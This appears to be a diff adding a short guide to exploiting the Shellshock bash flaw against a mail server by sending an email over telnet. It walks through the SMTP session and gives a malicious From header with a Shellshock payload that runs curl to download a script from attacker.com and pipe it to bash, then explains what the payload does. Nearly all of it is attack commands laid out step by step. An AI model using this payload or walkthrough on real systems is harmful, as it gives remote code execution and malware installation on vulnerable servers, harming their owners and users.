@@ -1,0 +1,46 @@
+1.Crafting the Exploit through an Email using Telnet
+
+You can use Telnet to manually send an email to the target server with a malicious header or body. Here's how to do it:
+Step 1: Connect to the Mail Server
+
+Using Telnet, connect to the SMTP server of the target:
+
+telnet vulnerable-server.com 25
+
+- Replace vulnerable-server.com with the target's domain or IP address.
+- Port 25 is commonly used for SMTP, but it could also be 587 (submission) or 465 (secure SMTP).
+
+Step 2: Initiate the SMTP Communication
+
+After connecting, perform the SMTP handshake:
+
+EHLO attacker.com
+MAIL FROM:<attacker@malicious.com>
+RCPT TO:<target@vulnerable-server.com>
+DATA
+
+Step 3: Inject the Shellshock Payload
+
+Construct the email with malicious content. The payload can be injected into headers like From, Subject, or User-Agent, or even in the email body.
+
+Example: Exploiting with a Malicious Header
+
+From: "Exploiter" <() { :; }; /bin/bash -c 'curl http://attacker.com/malware.sh | bash'>
+Subject: Vulnerable Email Test
+
+This is a test email to exploit Shellshock.
+.
+
+Explanation:
+
+    The From header contains the Shellshock payload:
+    () { :; }; /bin/bash -c 'curl http://attacker.com/malware.sh | bash'
+    The payload instructs Bash to download and execute a script from the attacker's server.
+
+
+Step 4: Send the Email
+
+Complete the email transmission with a single period (.) on a new line:
+
+.
+QUIT
